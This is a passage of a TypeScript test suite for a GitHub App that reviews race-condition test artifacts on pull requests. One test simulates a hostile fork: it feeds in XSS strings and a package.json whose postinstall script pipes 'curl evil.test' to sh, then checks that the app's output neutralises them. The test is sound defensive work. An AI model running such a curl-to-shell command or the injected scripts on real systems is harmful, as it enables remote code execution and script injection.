// The GitHub App end to end, through the worker's real handler: signed webhook deliveries in, calls to a fake GitHub
// out, with the D1 migrations under node:sqlite (docs/github-app/README.md; src/github/*).
import { beforeEach, describe, expect, it } from "vitest";
import { handle } from "../src/collector.js";
import { limitedFor, publicDownloadUrl } from "../src/github/api.js";
import { verifyGithubSignature } from "../src/github/http.js";
import { parseState } from "../src/github/review.js";
import { githubLogin, githubSweep, JOB_MS } from "../src/github/handlers.js";
import {
  claimDelivery,
  githubRetention,
  OUTSIDE_REVIEWS_PER_HOUR,
  PENDING_ASKED,
  PENDING_AUTHOR,
  PENDING_EVENT,
  PR_REVIEWS_PER_HOUR,
  prRow,
  PUSH_REVIEWS_PER_HOUR,
  releaseLease,
  REVIEWS_PER_HOUR,
  REVIEWS_PER_PR,
  takeLease,
} from "../src/github/store.js";
import { advance, call, createApp, detection, now, ORIGIN, resetClock, sendBatch, setPlan, signedIn } from "./account-helpers.js";
import {
  API,
  APP_ID,
  commentEvent,
  deliver,
  fakeGithub,
  githubSetup,
  INSTALLATION,
  installationCreated,
  OWNER,
  PRIVATE_KEY_PKCS8,
  pullEvent,
  pullRequest,
  raceFile,
  races,
  racesZip,
  REPO,
  result,
  runEvent,
  SHA1,
  SHA2,
  SHA3,
  signature,
  STORAGE,
  WEBHOOK_SECRET,
} from "./github-helpers.js";

beforeEach(() => {
  resetClock();
});

/** An installation, a pull request opened at SHA1, and its test run finished with the fixtures uploaded. */
async function reviewed(over: Parameters<typeof githubSetup>[0] = {}, settings?: string) {
  const s = githubSetup(over);
  const gh = fakeGithub();
  if (settings !== undefined) gh.settings.set(REPO.full_name, settings);
  await deliver(s.env, "installation", installationCreated(), { fetch: gh.fetch });
  expect(await result(await pullRequest(s.env, gh, "opened", 12, SHA1))).toBe("no race files");
  const run = gh.addRun(SHA1);
  const r = await deliver(s.env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch });
  return { ...s, gh, run, after: await result(r) };
}

describe("github app: the webhook (docs/github-app/README.md, \"Security\")", () => {
  it("GitHub's documented test vector passes the signature check, and nothing else does", async () => {
    const body = new TextEncoder().encode("Hello, World!");
    const good = "sha256=757107ea0eb2509fc211221cce984b8a37570b6d7586c22c46f4379c8b043e17";
    expect(await verifyGithubSignature(body, good, "It's a Secret to Everybody")).toBe(true);
    expect(await verifyGithubSignature(body, good, "It's a Secret to Everybody!")).toBe(false);
    expect(await verifyGithubSignature(new TextEncoder().encode("Hello, World?"), good, "It's a Secret to Everybody")).toBe(false);
    for (const bad of [null, "", "sha256=", "sha1=757107ea0eb2509fc211221cce984b8a37570b6d", good.toUpperCase(), `${good}00`, good.replace("sha256=", "")]) {
      expect(await verifyGithubSignature(body, bad, "It's a Secret to Everybody"), String(bad)).toBe(false);
    }
    expect(await verifyGithubSignature(body, good, "")).toBe(false);
  });

  it("without the app's secrets the webhook answers 503, its pages are not this worker's, and nothing else changes", async () => {
    const { env, sql } = githubSetup({ GITHUB_APP_ID: undefined });
    const r = await deliver(env, "installation", installationCreated());
    expect(r.status).toBe(503);
    expect(sql.rows("SELECT * FROM github_installations")).toEqual([]);
    for (const path of ["/github", "/github/setup", "/github/install", "/github/connect"]) expect((await call(env, "GET", path)).status, path).toBe(404);
    expect((await call(env, "GET", "/api/account/github")).status).toBe(404);
    expect((await call(env, "GET", "/v1/health")).status).toBe(200);
    expect((await call(env, "GET", "/login")).status).toBe(200);
  });

  it("a delivery without a valid signature is refused before anything is parsed or stored", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    const payload = JSON.stringify(installationCreated());
    for (const header of [null, "sha256=" + "0".repeat(64), await signature(payload, "another-secret-0123456789"), await signature(`${payload} `)]) {
      const r = await deliver(env, "installation", payload, { fetch: gh.fetch, header });
      expect(r.status).toBe(401);
    }
    expect(sql.rows("SELECT * FROM github_installations")).toEqual([]);
    expect(sql.rows("SELECT * FROM github_deliveries")).toEqual([]);
    expect(gh.calls).toEqual([]);
    // signed, but not JSON or without a delivery id
    expect((await deliver(env, "installation", "{not json", { fetch: gh.fetch })).status).toBe(400);
    expect((await deliver(env, "installation", payload, { fetch: gh.fetch, id: "x" })).status).toBe(400);
    expect((await handle(new Request(`${ORIGIN}/api/github/webhook`, { method: "GET" }), env, { now })).status).toBe(405);
  });

  it("a delivery id is handled once; an event the app does not take is acknowledged and ignored", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    const id = "11111111-2222-4333-8444-555555555555";
    expect(await result(await deliver(env, "installation", installationCreated(), { fetch: gh.fetch, id }))).toBe("created");
    const again = await deliver(env, "installation", installationCreated({ account: { ...OWNER, login: "renamed" } }), { fetch: gh.fetch, id });
    expect(await again.json()).toEqual({ ok: true, duplicate: true });
    expect(sql.rows("SELECT account_login FROM github_installations")).toEqual([{ account_login: "acme" }]);
    for (const event of ["push", "star", "marketplace_purchase", "pull_request_review"]) {
      expect(await result(await deliver(env, event, { action: "created" }, { fetch: gh.fetch })), event).toBe("ignored");
    }
    expect(await result(await deliver(env, "ping", { zen: "Keep it logically awesome." }, { fetch: gh.fetch }))).toBe("pong");
    expect(await result(await deliver(env, "github_app_authorization", { action: "revoked" }, { fetch: gh.fetch }))).toBe("ignored");
    expect(sql.rows("SELECT COUNT(*) AS n FROM github_deliveries")[0]!.n).toBe(3);
  });

  it("in production the answer comes first and the work runs after it; a job that fails forgets its delivery so a redelivery runs", async () => {
    const { env, sql } = githubSetup();
    let down = true;
    const gh = fakeGithub({ answer: (c) => (down && c.path.includes("/access_tokens") ? new Response("{}", { status: 502 }) : undefined) });
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    gh.pulls.set(`${REPO.full_name}#12`, pullEvent("opened", 12, SHA1).pull_request);
    const jobs: Promise<unknown>[] = [];
    const id = "aaaaaaaa-2222-4333-8444-555555555555";
    const r = await deliver(env, "pull_request", pullEvent("opened", 12, SHA1), { fetch: gh.fetch, id, waitUntil: (p) => jobs.push(p) });
    expect(r.status).toBe(202);
    expect(await r.json()).toEqual({ ok: true, queued: true });
    expect(jobs).toHaveLength(1);
    expect(await jobs[0]).toBe("failed: server");
    expect(sql.rows("SELECT id FROM github_deliveries WHERE id = ?", id)).toEqual([]);
    // the lease was let go, so the redelivery (the same id) reviews the pull request
    down = false;
    expect(await result(await deliver(env, "pull_request", pullEvent("opened", 12, SHA1), { fetch: gh.fetch, id }))).toBe("no race files");
    expect(gh.checksAt(SHA1)).toHaveLength(1);
  });
});

describe("github app: installations", () => {
  it("created, suspended, unsuspended, repositories removed, deleted: the rows follow, and an uninstall leaves nothing", async () => {
    const { env, sql, gh } = await reviewed();
    expect(sql.rows("SELECT id, account_id, account_login, account_type, selection, owner, suspended FROM github_installations")).toEqual([
      { id: INSTALLATION, account_id: OWNER.id, account_login: "acme", account_type: "Organization", selection: "selected", owner: null, suspended: null },
    ]);
    expect(sql.rows("SELECT number FROM github_prs")).toEqual([{ number: 12 }]);

    await deliver(env, "installation", { ...installationCreated(), action: "suspend" }, { fetch: gh.fetch });
    expect(sql.rows("SELECT suspended FROM github_installations")[0]!.suspended).not.toBeNull();
    const before = gh.calls.length;
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("suspended");
    expect(gh.calls.length).toBe(before);
    await deliver(env, "installation", { ...installationCreated(), action: "unsuspend" }, { fetch: gh.fetch });
    expect(sql.rows("SELECT suspended FROM github_installations")[0]!.suspended).toBeNull();

    expect(sql.rows("SELECT repo_id FROM github_repo_facts")).toEqual([{ repo_id: REPO.id }]);
    await deliver(env, "installation_repositories", { action: "removed", installation: { id: INSTALLATION }, repository_selection: "selected", repositories_removed: [{ id: REPO.id }], repositories_added: [] }, { fetch: gh.fetch });
    expect(sql.rows("SELECT * FROM github_prs")).toEqual([]);
    expect(sql.rows("SELECT * FROM github_repo_facts")).toEqual([]);

    await pullRequest(env, gh, "opened", 13, SHA2);
    expect(sql.rows("SELECT number FROM github_prs")).toEqual([{ number: 13 }]);
    // what was done once for the repository went with it, so the row made here is new
    expect(sql.rows("SELECT repo_id FROM github_repo_facts")).toEqual([{ repo_id: REPO.id }]);
    await deliver(env, "installation", { ...installationCreated(), action: "deleted" }, { fetch: gh.fetch });
    for (const t of ["github_installations", "github_repos", "github_repo_facts", "github_prs", "github_usage"]) expect(sql.rows(`SELECT * FROM ${t}`), t).toEqual([]);
  });

  it("an event for an installation whose created event never arrived records it from the event itself", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    expect(await result(await pullRequest(env, gh, "opened", 12, SHA1))).toBe("no race files");
    expect(sql.rows("SELECT id, account_login FROM github_installations")).toEqual([{ id: INSTALLATION, account_login: "acme" }]);
  });
});

describe("github app: reviewing a pull request", () => {
  it("opened with no test run yet, on selected repositories: one skipped check that says what the app reads, no comment, and only the calls it needs", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    expect(await result(await pullRequest(env, gh, "opened", 12, SHA1))).toBe("no race files");
    expect(gh.calls.map((c) => `${c.method} ${c.path}`)).toEqual([
      `POST /app/installations/${INSTALLATION}/access_tokens`,
      "GET /repos/acme/shop/pulls/12",
      "GET /repos/acme/shop/contents/.github/genclass.yml",
      "GET /repos/acme/shop/actions/runs",
      "POST /repos/acme/shop/check-runs",
    ]);
    // the token was asked for this repository only
    expect(gh.calls[0]!.body).toEqual({ repository_ids: [REPO.id] });
    const [check] = gh.checksAt(SHA1);
    expect(check).toMatchObject({ name: "GenClass", status: "completed", conclusion: "skipped" });
    expect(check.output.title).toBe("No race files to read yet");
    expect(check.output.summary).toContain("none has been read for this repository yet");
    expect(check.output.summary).toContain("upload `test-results/genclass` from the workflow");
    expect(check.output.summary).toContain("This check is written once");
    expect(gh.posted(12)).toEqual([]);
    // nothing was read of the commit, so nothing was counted against the installation's hour; the pull request's row knows its head
    expect(sql.rows("SELECT * FROM github_usage")).toEqual([]);
    expect(sql.rows("SELECT head_sha, due FROM github_prs")).toEqual([{ head_sha: SHA1, due: null }]);
  });

  it("the test run finishes: the artifact is read without credentials going to storage, and the comment and check say what was flagged", async () => {
    const { gh, after, sql } = await reviewed();
    expect(after).toBe("findings");
    // the storage host got no Authorization header
    expect(gh.storage).toHaveLength(1);
    expect(gh.storage[0]!.url.startsWith(`${STORAGE}/a/`)).toBe(true);
    expect(gh.storage[0]!.headers.authorization).toBeUndefined();
    const body = gh.summary(12)!;
    expect(body).toContain("**2 findings** in this pull request's tests at `1111111` · 1 reproducible · 2 tests read");
    expect(body).toContain("| 1 | New | Duplicate submit · `POST /api/orders` |");
    expect(body).toContain("| 2 | New | Stale response · `GET /api/search` |");
    expect(body).toContain("genclass-dev[bot] read 4 race files from the artifact `genclass-races`");
    // the same check run on that commit was updated, not a second one added
    const checks = gh.checksAt(SHA1);
    expect(checks).toHaveLength(1);
    expect(checks[0]).toMatchObject({ status: "completed", conclusion: "neutral" });
    expect(checks[0].output.title).toBe("2 findings, 1 reproducible");
    expect(checks[0].output.text).toContain("#### Race report");
    const row = sql.rows("SELECT head_sha, comment_id, check_run_id, reviews, lease, pending FROM github_prs")[0]!;
    expect(row).toMatchObject({ head_sha: SHA1, reviews: 2, lease: null, pending: 0 });
    expect(row.comment_id).toBeGreaterThan(0);
    // every repository call carried a token minted for this repository
    expect(gh.apiCalls().every((c) => gh.tokens.has(c.auth.replace("Bearer ", "")))).toBe(true);
    expect(gh.calls.filter((c) => c.path.includes("/access_tokens"))).toHaveLength(1);
  });

  it("a run without race files starts nothing; the same evidence read again writes nothing", async () => {
    const { env, gh, sql } = await reviewed();
    const other = gh.addRun(SHA1, { "playwright-report": racesZip() }, { name: "lint", workflow_id: 2 });
    const before = gh.calls.length;
    expect(await result(await deliver(env, "workflow_run", runEvent(other.id, SHA1), { fetch: gh.fetch }))).toBe("no race files in this run");
    expect(gh.calls.slice(before).map((c) => `${c.method} ${c.path}`)).toEqual([`GET /repos/acme/shop/actions/runs/${other.id}/artifacts`]);
    expect(await result(await deliver(env, "workflow_run", runEvent(999, "f".repeat(40)), { fetch: gh.fetch }))).toBe("no pull request at this commit");
    // the first run delivered again under a new id (a re-run): read, compared, nothing written
    const run = gh.runs.get(REPO.full_name)![0]!;
    const mark = gh.calls.length;
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("findings");
    const writes = gh.calls.slice(mark).filter((c) => c.method !== "GET");
    expect(writes).toEqual([]);
    expect(gh.posted(12)).toHaveLength(1);
    // only a review that wrote something counts toward the pull request's 400
    expect(sql.rows("SELECT reviews FROM github_prs")[0]!.reviews).toBe(2);
  });

  it("the next push: the same comment is edited, a new check goes on the new commit, and the findings keep their numbers", async () => {
    const { env, gh, sql } = await reviewed();
    const commentId = sql.rows("SELECT comment_id FROM github_prs")[0]!.comment_id;
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("no race files");
    expect(gh.summary(12)).toContain("No race files for `2222222`.");
    expect(gh.summary(12)).toContain("| 1 | New | Duplicate submit");
    // the new commit's run: checkout ran clean, search is still flagged, and the cart test flags something new
    const t = "checkout.spec.ts > checkout > places one order";
    const run = gh.addRun(SHA2, {
      "genclass-races": racesZip({ "a.json": races(t, 1, []), "b.json": races(t, 2, []), "c.json": raceFile("search-1.json"), "d.json": raceFile("search-2.json"), "e.json": races("cart.spec.ts > cart > adds", 1, [{ diagnosis: "failing", op: "GET /api/cart", trigger: "failure" }]) }),
    });
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA2), { fetch: gh.fetch }))).toBe("findings");
    expect(gh.posted(12)).toHaveLength(1);
    expect(sql.rows("SELECT comment_id FROM github_prs")[0]!.comment_id).toBe(commentId);
    const body = gh.summary(12)!;
    expect(body).toContain("**2 findings** in this pull request's tests at `2222222` · 0 reproducible · 1 new · 1 not flagged now · 3 tests read");
    expect(body).toContain("| 3 | New | Failing endpoint · `GET /api/cart` |");
    expect(body).toContain("| 2 | Still flagged | Stale response · `GET /api/search` |");
    expect(body).toContain("| 1 | Not flagged now | Duplicate submit · `POST /api/orders` | checkout.spec.ts > checkout > places one order | last flagged at `1111111` |");
    expect(gh.checksAt(SHA1)).toHaveLength(1);
    expect(gh.checksAt(SHA2)).toHaveLength(1);
    expect(gh.checksAt(SHA2)[0].output.title).toBe("2 findings, 0 reproducible");
    // a clean third commit: the comment says so (it is not deleted), the check succeeds
    await pullRequest(env, gh, "synchronize", 12, SHA3);
    const clean = gh.addRun(SHA3, { "genclass-races": racesZip({ "a.json": races(t, 1, []), "c.json": raceFile("search-1.json"), "e.json": races("cart.spec.ts > cart > adds", 1, []) }) });
    expect(await result(await deliver(env, "workflow_run", runEvent(clean.id, SHA3), { fetch: gh.fetch }))).toBe("nothing flagged");
    expect(gh.summary(12)).toContain("**Nothing flagged** in 3 tests at `3333333` · 3 earlier findings not flagged now");
    expect(gh.checksAt(SHA3)[0]).toMatchObject({ conclusion: "success" });
    expect(gh.posted(12)).toHaveLength(1);
  });

  it("nothing flagged from the start is a successful check and no comment at all", async () => {
    const { env } = githubSetup();
    const gh = fakeGithub();
    await pullRequest(env, gh, "opened", 12, SHA1);
    const run = gh.addRun(SHA1, { "genclass-races": racesZip({ "c.json": raceFile("search-1.json") }) });
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("nothing flagged");
    expect(gh.posted(12)).toEqual([]);
    expect(gh.checksAt(SHA1)[0]).toMatchObject({ conclusion: "success" });
    expect(gh.checksAt(SHA1)[0].output.title).toBe("Nothing flagged in 1 test");
  });

  it("a pull request from a fork is reviewed the same way, from the artifact its run uploaded", async () => {
    const { env } = githubSetup();
    const gh = fakeGithub();
    const fork = { head: { sha: SHA1, ref: "patch-1", repo: { id: 99001, full_name: "mallory/shop" } } };
    await pullRequest(env, gh, "opened", 14, SHA1, fork);
    const run = gh.addRun(SHA1);
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("findings");
    expect(gh.summary(14)).toContain("**2 findings**");
  });

  it("what a fork puts in its race files is shown as text: no markup, no mention, no link, and files that are not race files are listed as skipped", async () => {
    const { env } = githubSetup();
    const gh = fakeGithub();
    await pullRequest(env, gh, "opened", 15, SHA1);
    const evil = "x.spec.ts > <img src=x onerror=alert(1)> [click](https://evil.test) @octocat closes #1";
    const run = gh.addRun(SHA1, {
      "genclass-races": racesZip({
        "one.json": races(evil, 1, [{ diagnosis: "duplicate", op: "POST /api/a", evidence: "<script>alert(1)</script> ping @acme/owners" }]),
        "two.json": races(evil, 2, [{ diagnosis: "duplicate", op: "POST /api/a" }]),
        "package.json": '{"name":"not-a-race-file","scripts":{"postinstall":"curl evil.test | sh"}}',
        "notes.txt": "ignored: not json",
      }),
    });
    await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch });
    const body = gh.summary(15)!;
    const prose = body.replace(/`+[^`\n]*`+/g, "");
    expect(prose).not.toMatch(/(?<!\\)<(?!\/?(details|summary|sub)>|!-- genclass-bot)/);
    expect(body).not.toMatch(/@octocat|@acme\/owners/);
    expect(body).not.toContain("[click](https://evil.test)");
    expect(body).toContain("##### Files skipped (1)");
    expect(body).toContain("`genclass-races/package.json`");
    expect(body).not.toContain("postinstall");
    expect(body).not.toContain("notes.txt");
  });

  it("settings come from the default branch: comment never, check off, automatic reviews off, drafts, base branches, authors", async () => {
    const quiet = await reviewed({}, "comment: never\n");
    expect(quiet.gh.posted(12)).toEqual([]);
    expect(quiet.gh.checksAt(SHA1)[0].output.title).toBe("2 findings, 1 reproducible");

    const noCheck = await reviewed({}, "check: false\n");
    expect(noCheck.gh.checksAt(SHA1)).toEqual([]);
    expect(noCheck.gh.summary(12)).toContain("**2 findings**");

    const off = githubSetup();
    const gh = fakeGithub();
    gh.settings.set(REPO.full_name, "reviews:\n  auto: false\n");
    gh.addRun(SHA1);
    expect(await result(await pullRequest(off.env, gh, "opened", 12, SHA1))).toBe("automatic reviews are off");
    expect(gh.calls.filter((c) => c.method !== "GET" && !c.path.includes("access_tokens"))).toEqual([]);

    const s = githubSetup();
    const g = fakeGithub();
    g.settings.set(REPO.full_name, 'reviews:\n  branches: [main, "release/*"]\n  ignore_authors: ["Dependabot[bot]"]\n');
    expect(await result(await pullRequest(s.env, g, "opened", 20, SHA1, { draft: true }))).toBe("draft");
    expect(await result(await pullRequest(s.env, g, "ready_for_review", 20, SHA1))).toBe("no race files");
    expect(await result(await pullRequest(s.env, g, "opened", 21, SHA2, { base: { ref: "experiment", repo: { id: REPO.id } } }))).toBe("base branch not reviewed");
    expect(await result(await pullRequest(s.env, g, "opened", 22, SHA2, { base: { ref: "release/2.0", repo: { id: REPO.id } } }))).toBe("no race files");
    expect(await result(await pullRequest(s.env, g, "opened", 23, SHA3, { user: { id: 5, login: "dependabot[bot]", type: "Bot" } }))).toBe("author not reviewed");
    // the file was asked for once and then served from the cache for two minutes
    expect(g.calls.filter((c) => c.path.endsWith("/contents/.github/genclass.yml"))).toHaveLength(1);
    advance(121_000);
    await pullRequest(s.env, g, "synchronize", 22, SHA3);
    expect(g.calls.filter((c) => c.path.endsWith("/contents/.github/genclass.yml"))).toHaveLength(2);
  });

  it("a settings file with a mistake does not stop the review: the defaults apply and the check says what is wrong", async () => {
    const { gh } = await reviewed({}, "comment: loud\nmin_seeds: 1\nfoo: bar\n");
    const check = gh.checksAt(SHA1)[0];
    expect(check.output.summary).toContain("**Settings**");
    expect(check.output.summary).toContain("foo is not a setting; it was ignored.");
    expect(check.output.summary).toContain("comment must be one of findings, always, never; using findings.");
    // min_seeds: 1 was valid and applied: both findings are reproducible now
    expect(check.output.title).toBe("2 findings, 2 reproducible");
    const broken = await reviewed({}, "reviews: [\n");
    expect(broken.gh.checksAt(SHA1)[0].output.summary).toMatch(/\.github\/genclass\.yml could not be read \(line 1: /);
    expect(broken.gh.summary(12)).toContain("**2 findings**");
  });

  it("fail_on: the check waits in progress for the test run and fails on a reproducible finding; a run without race files that finishes first starts no review", async () => {
    // race files were read for this repository before, so its pull requests get the check from a commit's first event
    const { env, sql, gh } = await reviewed({}, "check:\n  fail_on: reproducible\n");
    expect(gh.checksAt(SHA1)[0]).toMatchObject({ status: "completed", conclusion: "failure" });
    const state = () => parseState(String(sql.rows("SELECT state FROM github_prs")[0]!.state));
    const usage = () => Number(sql.rows("SELECT reviews FROM github_usage")[0]!.reviews);
    gh.runs.get(REPO.full_name)!.push({ id: 6001, head_sha: SHA2, status: "in_progress", conclusion: null });
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("waiting for the test run");
    expect(gh.checksAt(SHA2)[0]).toMatchObject({ status: "in_progress" });
    expect(gh.checksAt(SHA2)[0].conclusion).toBeUndefined();
    expect(state()).toMatchObject({ waiting: SHA2, held: true });
    // the row says a review is owed for as long as the check waits (what the daily sweep goes by)
    expect(sql.rows("SELECT due FROM github_prs")[0]!.due).not.toBeNull();
    // A run without race files finishes while the test run is still going. Two requests say so (this run's artifacts,
    // the commit's runs): no review starts, and nothing is counted against the hour or the pull request.
    gh.runs.get(REPO.full_name)!.push({ id: 6002, head_sha: SHA2, name: "lint", workflow_id: 2 });
    const used = usage();
    const reviews = sql.rows("SELECT reviews, hour_reviews FROM github_prs")[0]!;
    const mark = gh.calls.length;
    expect(await result(await deliver(env, "workflow_run", runEvent(6002, SHA2), { fetch: gh.fetch }))).toBe("waiting for the test run");
    expect(gh.calls.slice(mark).map((c) => `${c.method} ${c.path}`)).toEqual(["GET /repos/acme/shop/actions/runs/6002/artifacts", "GET /repos/acme/shop/actions/runs"]);
    expect(usage()).toBe(used);
    expect(sql.rows("SELECT reviews, hour_reviews FROM github_prs")[0]).toEqual(reviews);
    expect(gh.checksAt(SHA2)[0]).toMatchObject({ status: "in_progress" });
    // the test run finishes with a reproducible finding: the same check fails
    const run = gh.runs.get(REPO.full_name)!.find((r) => r.id === 6001)!;
    run.status = "completed";
    run.conclusion = "success";
    run.artifacts = { "genclass-races": racesZip() };
    expect(await result(await deliver(env, "workflow_run", runEvent(6001, SHA2), { fetch: gh.fetch }))).toBe("findings");
    expect(gh.checksAt(SHA2)).toHaveLength(1);
    expect(gh.checksAt(SHA2)[0]).toMatchObject({ status: "completed", conclusion: "failure" });
    expect(state()).toMatchObject({ waiting: null, held: false });
    expect(sql.rows("SELECT due FROM github_prs")[0]!.due).toBeNull();
  });

  it("fail_on: a push that GitHub reports before its workflow runs exist waits too, and a person's review ends the wait", async () => {
    const { env, sql, gh } = await reviewed({}, "check:\n  fail_on: any\n");
    // no workflow run exists yet for the new commit
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("waiting for the test run");
    expect(gh.checksAt(SHA2)[0]).toMatchObject({ status: "in_progress" });
    expect(gh.checksAt(SHA2)[0].output.title).toBe("Waiting for this commit's test run");
    expect(parseState(String(sql.rows("SELECT state FROM github_prs")[0]!.state)).waiting).toBe(SHA2);
    // the run arrives with nothing flagged: the same check completes, green
    const run = gh.addRun(SHA2, { "genclass-races": racesZip({ "c.json": raceFile("search-1.json") }) });
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA2), { fetch: gh.fetch }))).toBe("nothing flagged");
    expect(gh.checksAt(SHA2)).toHaveLength(1);
    expect(gh.checksAt(SHA2)[0]).toMatchObject({ status: "completed", conclusion: "success" });
    // a commit that starts no workflow at all: it waits, until someone asks (or the daily sweep does, below)
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA3))).toBe("waiting for the test run");
    expect(gh.checksAt(SHA3)[0]).toMatchObject({ status: "in_progress" });
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev review"), { fetch: gh.fetch }))).toBe("no race files");
    expect(gh.checksAt(SHA3)).toHaveLength(1);
    expect(gh.checksAt(SHA3)[0]).toMatchObject({ status: "completed", conclusion: "neutral" });
    expect(gh.checksAt(SHA3)[0].output.title).toBe("No race files for this commit");
    // without fail_on nothing waits: the default never holds a pull request up
    const plain = await reviewed();
    expect(await result(await pullRequest(plain.env, plain.gh, "synchronize", 12, SHA2))).toBe("no race files");
    expect(plain.gh.checksAt(SHA2)[0]).toMatchObject({ status: "completed", conclusion: "neutral" });
  });

  it("an inline comment goes on the test's line when the diff shows it, once", async () => {
    const { env } = githubSetup();
    const gh = fakeGithub();
    const t = "checkout.spec.ts > checkout > places one order";
    const loc = { location: { file: "tests/checkout.spec.ts", line: 12 } };
    gh.files.set(`${REPO.full_name}#12`, [
      { filename: "tests/checkout.spec.ts", status: "modified", patch: "@@ -8,6 +8,9 @@ test.describe\n ctx\n+test('places one order', async () => {\n+});\n" },
      { filename: "src/cart.ts", status: "modified", patch: "@@ -1 +1 @@\n-a\n+b" },
    ]);
    await pullRequest(env, gh, "opened", 12, SHA1);
    const run = gh.addRun(SHA1, { "genclass-races": racesZip({ "a.json": races(t, 1, [{ diagnosis: "duplicate", op: "POST /api/orders" }], loc), "b.json": races(t, 2, [{ diagnosis: "duplicate", op: "POST /api/orders" }], loc) }) });
    await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch });
    expect(gh.reviews).toHaveLength(1);
    expect(gh.reviews[0]!.body).toMatchObject({ commit_id: SHA1, event: "COMMENT", comments: [{ path: "tests/checkout.spec.ts", line: 12, side: "RIGHT" }] });
    expect(gh.reviews[0]!.body.comments[0].body).toContain("**GenClass, finding 1**: Duplicate submit on `POST /api/orders`");
    // read again, and pushed again with the finding still there: no second inline comment
    await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch });
    await pullRequest(env, gh, "synchronize", 12, SHA2);
    const again = gh.addRun(SHA2, run.artifacts);
    await deliver(env, "workflow_run", runEvent(again.id, SHA2), { fetch: gh.fetch });
    expect(gh.reviews).toHaveLength(1);
    // without a location in the files, the changed files are not even listed
    const plain = await reviewed();
    expect(plain.gh.calls.some((c) => c.path.endsWith("/files"))).toBe(false);
    expect(plain.gh.reviews).toEqual([]);
  });

  it("a comment someone deleted comes back only when there is a new finding to tell them about", async () => {
    const { env, gh, sql } = await reviewed();
    const id = Number(sql.rows("SELECT comment_id FROM github_prs")[0]!.comment_id);
    gh.deletedComments.add(id);
    await pullRequest(env, gh, "synchronize", 12, SHA2);
    const same = gh.addRun(SHA2);
    await deliver(env, "workflow_run", runEvent(same.id, SHA2), { fetch: gh.fetch });
    expect(gh.summary(12)).toBeNull();
    expect(sql.rows("SELECT comment_id FROM github_prs")[0]!.comment_id).toBeNull();
    await pullRequest(env, gh, "synchronize", 12, SHA3);
    const more = gh.addRun(SHA3, { "genclass-races": racesZip({ "a.json": raceFile("checkout-1.json"), "b.json": raceFile("checkout-2.json"), "n.json": races("new.spec.ts > n", 1, [{ diagnosis: "stale", op: "GET /api/new" }]) }) });
    await deliver(env, "workflow_run", runEvent(more.id, SHA3), { fetch: gh.fetch });
    expect(gh.summary(12)).toContain("| 3 | New | Stale response · `GET /api/new` |");
  });

  it("a deleted comment does not come back for a finding that was listed before and is flagged again", async () => {
    const { env, gh, sql } = await reviewed();
    const statuses = () => parseState(String(sql.rows("SELECT state FROM github_prs")[0]!.state)).findings.map((f) => [f.n, f.status]);
    const posts = () => gh.calls.filter((c) => c.method === "POST" && c.path === "/repos/acme/shop/issues/12/comments").length;
    const search = "search.spec.ts > search > shows the results of the last query";
    const checkout = { "a.json": raceFile("checkout-1.json"), "b.json": raceFile("checkout-2.json") };
    expect(posts()).toBe(1);
    gh.deletedComments.add(Number(sql.rows("SELECT comment_id FROM github_prs")[0]!.comment_id));
    // The next commit's run has the search test without its finding (seen in one seed of two, it depends on timing):
    // finding 2 is "not flagged now". The comment is found deleted, and there is nothing new to tell.
    await pullRequest(env, gh, "synchronize", 12, SHA2);
    const without = gh.addRun(SHA2, { "genclass-races": racesZip({ ...checkout, "s1.json": races(search, 1, []), "s2.json": races(search, 2, []) }) });
    await deliver(env, "workflow_run", runEvent(without.id, SHA2), { fetch: gh.fetch });
    expect(statuses()).toEqual([[1, "still"], [2, "gone"]]);
    expect(gh.summary(12)).toBeNull();
    // flagged again at the next commit: the people in the pull request were told about finding 2 before
    await pullRequest(env, gh, "synchronize", 12, SHA3);
    const back = gh.addRun(SHA3);
    await deliver(env, "workflow_run", runEvent(back.id, SHA3), { fetch: gh.fetch });
    expect(statuses()).toEqual([[1, "still"], [2, "new"]]);
    expect(gh.summary(12)).toBeNull();
    // the same for a finding whose test was left out of a run and is back in the next
    const SHA4 = "4".repeat(40);
    const SHA5 = "5".repeat(40);
    await pullRequest(env, gh, "synchronize", 12, SHA4);
    const partly = gh.addRun(SHA4, { "genclass-races": racesZip(checkout) });
    await deliver(env, "workflow_run", runEvent(partly.id, SHA4), { fetch: gh.fetch });
    expect(statuses()).toEqual([[1, "still"], [2, "not-run"]]);
    await pullRequest(env, gh, "synchronize", 12, SHA5);
    const whole = gh.addRun(SHA5);
    await deliver(env, "workflow_run", runEvent(whole.id, SHA5), { fetch: gh.fetch });
    expect(statuses()).toEqual([[1, "still"], [2, "new"]]);
    expect(gh.summary(12)).toBeNull();
    expect(posts()).toBe(1);
    expect(sql.rows("SELECT comment_id FROM github_prs")[0]!.comment_id).toBeNull();
    // the check carries the result all along
    expect(gh.checksAt(SHA5)[0].output.title).toBe("2 findings, 1 reproducible");
  });

  it("closed: the row is kept for a reopen; merged with `issues: merge` and a reproducible finding: one issue", async () => {
    const { env, gh, sql } = await reviewed({}, "issues: merge\n");
    const closed = pullEvent("closed", 12, SHA1, { state: "closed", merged: true });
    gh.pulls.set(`${REPO.full_name}#12`, closed.pull_request);
